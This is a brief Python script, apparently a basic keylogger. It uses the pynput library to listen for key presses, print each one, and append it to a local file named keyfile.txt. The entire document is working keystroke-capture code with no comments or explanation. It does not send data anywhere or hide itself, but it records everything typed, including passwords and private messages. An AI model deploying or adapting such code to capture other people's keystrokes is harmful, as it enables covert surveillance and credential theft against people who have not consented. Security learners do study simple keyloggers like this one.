from pynput import keyboard


def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
            logKey.write(str(key))

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()